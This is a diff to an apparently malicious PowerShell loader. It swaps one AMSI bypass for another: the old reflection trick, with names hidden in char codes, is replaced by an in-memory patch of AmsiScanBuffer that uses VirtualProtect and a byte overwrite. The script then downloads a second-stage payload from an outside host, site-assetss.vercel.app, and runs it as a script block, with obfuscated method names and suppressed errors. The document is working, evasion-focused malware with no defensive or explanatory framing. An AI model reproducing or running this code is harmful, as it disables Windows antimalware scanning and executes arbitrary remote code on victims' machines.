@@ -1,19 +1,22 @@
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-# 1. Blind AMSI
-$t = [Ref].Assembly.GetType("System.Management.Automation.$([char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)")
-$f = $t.GetField("$([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)", 'NonPublic,Static')
-$f.SetValue($null, $true)
+# 1. AMSI Memory Patch (Overwrites AmsiScanBuffer in RAM)
+$z = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByAA==')) 
+$k = Add-Type -MemberDefinition '[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p); [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);' -Name 'K32' -PassThru
+$h = $k::LoadLibrary(('ams' + 'i.dll'))
+$p = $k::GetProcAddress($h, $z)
+$o = 0
+$k::VirtualProtect($p, [UIntPtr]6, 0x40, [ref]$o)
+[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3), 0, $p, 6)
 
-# 2. Fetch Stage 2
-$base = 'https://site-assetss.vercel.app' 
+# 2. Fetch & Exec config-policy.txt
+$base = 'https://site-assetss.vercel.app'
 $url = "$base/assets/config-policy.txt"
 $c = New-Object Net.WebClient
 $c.Headers.Add('User-Agent','Mozilla/5.0')
 $m = $c.GetType().GetMethod(('{0}{1}{2}' -f 'Down','load','String'))
 $s = $m.Invoke($c, @($url))
 
-# 3. Execute Stage 2
 $e = [System.Management.Automation.PSObject].Assembly.GetType(('System.Management.Automation.{0}{1}' -f 'Scri','ptBlock'))::Create($s)
 & $e
